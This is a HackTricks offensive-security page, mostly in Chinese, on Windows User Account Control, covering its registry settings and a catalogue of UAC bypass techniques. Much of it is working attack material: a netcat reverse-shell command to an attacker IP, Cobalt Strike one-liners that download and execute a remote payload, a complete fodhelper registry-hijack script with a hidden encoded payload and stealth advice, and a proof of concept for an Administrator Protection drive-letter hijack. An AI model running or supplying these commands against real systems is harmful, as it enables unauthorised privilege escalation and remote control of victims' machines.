# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个功能，使得对提权操作出现 **同意提示（consent prompt for elevated activities）**。应用程序具有不同的 `integrity` 级别，具有 **high level** 的程序可以执行可能 **危及系统** 的任务。当 UAC 启用时，应用和任务通常**在非管理员帐户的安全上下文下运行**，除非管理员明确授权这些应用/任务以管理员级别访问系统来运行。它是一个保护管理员免于意外更改的便利性功能，但不被视为安全边界。

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

当启用 UAC 时，管理员用户会得到两个令牌：一个是标准用户令牌，用于以常规级别执行普通操作；另一个包含管理员权限。

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 讨论了 UAC 的工作原理，包含登录过程、用户体验和 UAC 架构。管理员可以使用安全策略在本地层级（使用 secpol.msc）配置 UAC 的工作方式，或在 Active Directory 域环境中通过 Group Policy Objects (GPO) 进行配置并下发。各种设置在 [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) 中有详细讨论。可以为 UAC 设置 10 个组策略项。下表提供了更多细节：

| 组策略设置                                                                                                                                                                                                                                                                                                                                                           | 注册表键                    | 默认设置                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 已禁用                                                       |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 已禁用                                                       |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 对非 Windows 二进制文件提示同意                              |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 在安全桌面上提示输入凭据                                       |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 已启用（默认适用于家庭版） 已禁用（默认适用于企业版）         |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 已禁用                                                       |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 已启用                                                       |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 已启用                                                       |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 已启用                                                       |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 已启用                                                       |

### UAC Bypass Theory

如果**用户属于管理员组**，某些程序会被 **autoelevated automatically**。这些二进制文件的 _**Manifests**_ 中包含 _**autoElevate**_ 选项且值为 _**True**_。该二进制还必须由 **Microsoft 签名**。

许多 auto-elevate 进程通过 COM 对象或 RPC 服务器暴露 **功能**，这些功能可以从以 medium integrity（常规用户权限）运行的进程中调用。注意 COM (Component Object Model) 和 RPC (Remote Procedure Call) 是 Windows 程序用于在不同进程间通信和执行函数的方法。例如，**`IFileOperation COM object`** 用于处理文件操作（复制、删除、移动），并且可以在不弹出提示的情况下自动提升权限。

注意可能会执行一些检查，例如检查进程是否从 **System32 directory** 运行，这类检查可以被绕过，例如通过 **injecting into explorer.exe** 或其他位于 System32 的可执行文件。

绕过这些检查的另一种方法是**修改 PEB**。Windows 中的每个进程都有一个 Process Environment Block (PEB)，其中包含关于进程的重要数据，例如可执行文件路径。通过修改 PEB，攻击者可以伪造 (spoof) 自身恶意进程的位置，使其看起来从受信任目录（如 system32）运行。该伪造信息会欺骗 COM 对象，从而在不提示用户的情况下自动提升权限。

因此，为了**绕过** **UAC**（将权限从 **medium** 完整性级别提升到 **high**），一些攻击者会使用这类二进制来**执行任意代码**，因为代码将从 **High level integrity** 的进程中执行。

可以使用来自 Sysinternals 的工具 _**sigcheck.exe**_ 检查二进制的 _**Manifest**_。（`sigcheck.exe -m <file>`）并且可以使用 _Process Explorer_ 或 _Process Monitor_（来自 Sysinternals）查看进程的 **integrity level**。

### 检查 UAC

要确认 UAC 是否启用，请执行：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
如果是 **`1`**，则 UAC 为 **已启用**；如果是 **`0`** 或者不存在，则 UAC 为 **未启用**。

然后，检查配置了 **哪个级别**：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- 如果 **`0`**，UAC 不会弹出提示（例如 **已禁用**）
- 如果 **`1`**，管理员会被**要求输入用户名和密码**以在高权限下执行该二进制文件（在安全桌面）
- 如果 **`2`**（**始终提醒我**），当管理员尝试以高权限执行某些操作时，UAC 会始终要求管理员确认（在安全桌面）
- 如果 **`3`** 类似于 `1`，但不需要在安全桌面上
- 如果 **`4`** 类似于 `2`，但不需要在安全桌面上
- 如果 **`5`**（**默认**）它会要求管理员确认以高权限运行非 Windows 二进制文件

然后，你需要查看 **`LocalAccountTokenFilterPolicy`** 的值\
如果该值为 **`0`**，那么只有 **RID 500** 用户（**内置 Administrator**）能够在不触发 UAC 的情况下执行**管理任务**；如果为 `1`，**Administrators** 组内的所有帐户都可以执行这些操作。

最后查看键 **`FilterAdministratorToken`** 的值\
如果 **`0`**（默认），**内置 Administrator 帐户可以** 执行远程管理任务；如果 **`1`**，内置 Administrator 帐户**无法** 执行远程管理任务，除非 `LocalAccountTokenFilterPolicy` 被设置为 `1`。

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

你也可以检查你的用户所属的组并获取完整性级别：
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> 注意，如果你拥有对受害者的图形界面访问权限，UAC bypass 非常直接，因为当 UAC 提示出现时你只需点击 "Yes"

UAC bypass 需要在以下情况下：**UAC 已启用，您的进程运行在 medium integrity 上，并且您的用户属于 administrators group**。

需要特别说明的是，**如果 UAC 处于最高安全级别 (Always)，绕过 UAC 要比处于其他任一级别 (Default) 难得多。**

### UAC disabled

如果 UAC 已被禁用（`ConsentPromptBehaviorAdmin` 为 **`0`**），你可以使用类似下面的方法**以管理员权限（high integrity level）执行 reverse shell**：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

如果你以 Administrators group 中的用户获得了一个 shell，你可以通过 SMB (file system) 在本地将 **mount the C$** 共享挂载为一个新磁盘，这样你将拥有 **access to everything inside the file system**（甚至 Administrator home folder）。

> [!WARNING]
> **看起来这个技巧不再有效**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 cobalt strike 进行 UAC bypass

只有当 UAC 未设置为最高安全级别时，Cobalt Strike 的技术才会生效。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也有几个模块可以 **bypass** **UAC**。

### KRBUACBypass

文档和工具位于 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)是几个 UAC bypass exploits 的**合集**。注意你需要 **compile UACME using visual studio or msbuild**。编译会创建多个可执行文件（例如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），你需要知道**你需要哪个。**\
你应该 **小心**，因为有些 bypasses 会 **提示其他程序**，从而 **提醒** **用户** 有事情发生。

UACME 列出了**每种技术开始可用的构建版本**。你可以搜索影响你版本的技术：
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
另外，使用 [this](https://en.wikipedia.org/wiki/Windows_10_version_history) 页面可以从构建版本中得到 Windows 发布 `1607`。

### UAC Bypass – fodhelper.exe (Registry hijack)

受信任的二进制文件 `fodhelper.exe` 在现代 Windows 上会自动提升权限。启动时，它会查询下面的每用户注册表路径，但不会验证 `DelegateExecute` verb。在该处植入命令允许一个 Medium Integrity 进程（用户属于 Administrators）在不弹出 UAC prompt 的情况下生成一个 High Integrity 进程。

fodhelper 查询的注册表路径：
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell 步骤（设置你的 payload，然后触发）：
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Works when the current user is a member of Administrators and UAC level is default/lenient (not Always Notify with extra restrictions).
- Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
- Payload can be any command (PowerShell, cmd, or an EXE path). Avoid prompting UIs for stealth.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Noisy brute-force UAC bypass

If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考资料
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass 步骤](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – 用户帐户控制 (User Account Control) 的工作原理](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass 技术集合](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows 管理员保护 drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
